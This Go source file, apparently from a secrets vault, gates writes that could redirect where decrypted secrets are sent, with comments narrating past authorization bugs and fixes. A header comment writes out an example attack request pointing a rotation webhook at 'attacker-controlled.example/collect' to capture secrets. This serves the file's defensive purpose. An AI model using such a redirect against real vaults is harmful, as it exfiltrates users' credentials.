package handlers

import (
	"context"
	"net/url"
	"strings"

	"github.com/bright-interaction/trustissues/internal/egressgate"
	"github.com/bright-interaction/trustissues/internal/vaultegress"
)

// HOW A HOST-CHOOSING WRITE IS DECIDED. THE WRITE ITSELF IS NOT IN THIS PACKAGE.
//
// Four columns of vault_entries can move where a decrypted secret goes:
// destination_patterns, provider, provider_meta and rotation_targets. They are
// classified as egressChoosesHost in egress_field_coverage_test.go, and until
// round 5 that classification was the whole of the coverage: the table said
// rotation_targets chooses a host, and VaultHandler.UpdateTargets wrote it
// without asking anybody. A vault_only account holding an accepted EDITOR seat
// on somebody else's shared entry did
//
//	PUT /api/vault/{id}/targets
//	[{"type":"webhook","webhook_url":"https://attacker-controlled.example/collect"}]
//
// and the next scheduled rotation POSTed the freshly minted plaintext there.
//
// The lesson is not "we missed a column". It is that a per-handler check is a
// thing a handler can forget, and forgetting is invisible: the code that forgot
// looks exactly like code with nothing to check. So the check moved to where a
// write cannot happen without it.
//
// ROUND 5 PUT THAT CHECK IN THIS FILE and held the rule up with a test that read
// the source and matched it against regular expressions. A skeptic planted four
// write paths through the gaps in those patterns. The sharpest was an ordinary
// sqlc query with a table alias,
//
//	UPDATE vault_entries AS ve SET rotation_targets = ?, updated_at = CURRENT_TIMESTAMP WHERE ve.id = ?
//
// against a pattern of `update\s+vault_entries\s+set`. Every plant built, vetted
// clean and passed all four guards. Proving a property by recognising its
// textual form always loses, and the answer is never a better pattern.
//
// SO THE WRITES ARE NOT IN THIS PACKAGE ANY MORE. They live in
// internal/vaultegress, whose generated queries sit under
// internal/vaultegress/internal/egressq, a path Go's own `internal` rule makes
// unimportable from here. There is no method on *db.Queries to call and no
// package to import, so the round-5 defect written out literally does not
// compile:
//
//	h.queries.UpdateVaultEntryRotationTargets undefined
//	(type *db.Queries has no field or method UpdateVaultEntryRotationTargets)
//
// What is left here is the half that genuinely belongs to the handlers: the
// DERIVERS, which render a stored or proposed column value as the set of places
// the secret could end up, and the DECISIONS, which consult the authority oracle
// exactly when a write ADDS one of those places. egressgate.Decide turns the two
// into a Ticket, and every function in internal/vaultegress refuses without one.
//
// A write helper living in some other file of this package is now harmless
// rather than forbidden: it cannot perform the write without a Ticket either,
// because nothing can.

// The field names a Ticket is issued against, restated from internal/vaultegress
// so the code that MINTS a ticket and the code that CHECKS it cannot drift onto
// two spellings of one field. A Ticket for one of these cannot be spent on
// another, so permission to narrow a ceiling cannot be used to write a delivery
// target.
const (
	egressFieldDestinations   = vaultegress.FieldDestinations
	egressFieldProvider       = vaultegress.FieldProvider
	egressFieldProviderMeta   = vaultegress.FieldProviderMeta
	egressFieldRotationTarget = vaultegress.FieldRotationTargets
)

// ── the destination derivers ────────────────────────────────────────────────
//
// One per host-choosing field. Each renders a stored or proposed value as the
// set of places the secret could end up, so egressgate.Decide can ask the only
// question that matters: does this write ADD one?

// ceilingDestinations renders a capability ceiling as its destination set. The
// patterns are kept whole, host AND path, because the ceiling grammar is what
// capability.patternMatch honours: moving api.example.com/v1/chat to
// api.example.com/v1/files is the same host and a different destination.
func ceilingDestinations(patterns []string) []string {
	out := make([]string, 0, len(patterns))
	for _, p := range patterns {
		if p = strings.TrimSpace(p); p != "" {
			out = append(out, p)
		}
	}
	return out
}

// providerDestinations renders a (provider, provider_meta) pair as the hosts its
// adapter may reach, straight out of the declaration table. Computed from the
// DECLARED set rather than the raw column text, so "site: datadoghq.eu" ->
// "site: evil.example" reads as adding api.evil.example rather than as an opaque
// string edit.
func providerDestinations(provider string, meta map[string]string) []string {
	allow := declaredProviderEgress(provider, meta)
	out := append([]string{}, allow.hosts...)
	for _, s := range allow.suffixes {
		out = append(out, "*"+strings.ToLower(s))
	}
	return out
}

// providerDestinationCovers is the subsumption rule for the provider host set.
// It mirrors the suffix handling inside authorityForEgressChange: backblaze is
// the one vendor that names its own second storage host at runtime, so carrying
// its declared "*.backblazeb2.com" forward must not read as a widening when an
// unchanged entry is re-saved. Nothing else declares a suffix, and the suffix
// values are compile-time constants, so this cannot launder a new host in.
func providerDestinationCovers(have, want string) bool {
	have = strings.ToLower(strings.TrimSpace(have))
	want = strings.ToLower(strings.TrimSpace(want))
	if have == "" || want == "" {
		return false
	}
	if have == want {
		return true
	}
	if suffix, ok := strings.CutPrefix(have, "*"); ok {
		return strings.HasSuffix(want, suffix) && len(want) > len(suffix)
	}
	return false
}

// deliveryDestinations renders rotation targets as their destination set.
//
// Only the types that actually carry the secret VALUE off the box count.
// "notify" fires a channel message and never includes the value, so adding one
// is not a redirect and stays open to anyone with manage. That is deliberate:
// the gate is about where plaintext goes, not about who may configure the
// rotation panel.
//
// The unit is rotationTargetIdentity, i.e. the whole destination including the
// path, not just the hostname. A webhook moved from /deploy to /collect on the
// same host is a different place for the secret to land, and the identity
// function already excludes the label and the HMAC secret so renaming a target
// or rotating its signing key is not treated as a redirect.
func deliveryDestinations(targets []RotationTarget) []string {
	out := make([]string, 0, len(targets))
	for _, t := range targets {
		if !targetTransmitsSecret(t) {
			continue
		}
		out = append(out, rotationTargetIdentity(t))
	}
	return out
}

// deliveryDestinationHosts renders target identities as hostnames, for the
// refusal an operator reads. A 403 that says "denied" without naming the host
// somebody just tried to add sends them to the logs to find out what they did.
func deliveryDestinationHosts(identities []string) []string {
	out := make([]string, 0, len(identities))
	for _, id := range identities {
		parts := strings.SplitN(id, "|", 3)
		if len(parts) < 2 {
			out = append(out, id)
			continue
		}
		raw := parts[1]
		// u.Host, not u.Hostname(): the port is part of where a delivery lands and
		// an operator reading the refusal wrote it themselves. Stripping it would
		// render two different destinations identically in the one message whose
		// job is to say which one was refused.
		if u, err := url.Parse(strings.TrimSpace(raw)); err == nil && u.Host != "" {
			out = append(out, u.Host)
			continue
		}
		out = append(out, raw)
	}
	return out
}

// ── the decisions ───────────────────────────────────────────────────────────

// decideDeliveryEgress answers whether userID may store `next` as this entry's
// delivery targets, given what is currently stored.
//
// Same authority as destination_patterns, deliberately: adding a delivery target
// IS adding a destination. deliverToWebhook POSTs {"new_value": <the secret>} to
// a URL somebody named, which is the same act as pointing the capability proxy
// at a host somebody named, and until round 5 the two were held to different
// rights on the same entry.
//
// See DEFERRED (i) for what this replaces and which four guards changed premise.
//
// THERE IS NO isAdmin PARAMETER, and that is the round-6 fix. Round 5 gave this
// function one and passed middleware.IsAdmin into it, while targetStillAuthorized
// asked the same oracle with isAdmin hardcoded false. An instance admin, the
// principal the rule names in the same breath as the creator, could therefore
// configure a target that was accepted, reported as saved, and then silently
// never delivered. A parameter is a thing two call sites can pass differently;
// mayConfigureDelivery answers the admin question itself, from the users row,
// for both halves.
func (h *VaultHandler) decideDeliveryEgress(ctx context.Context, userID string,
	entryID string, stored, next []RotationTarget) (egressgate.Ticket, error) {

	return egressgate.Decide(egressgate.Request{
		EntryID: entryID,
		What:    egressFieldRotationTarget,
		Before:  deliveryDestinations(stored),
		After:   deliveryDestinations(next),
		MayRedirect: func() bool {
			return h.mayConfigureDelivery(ctx, userID, entryID)
		},
	})
}
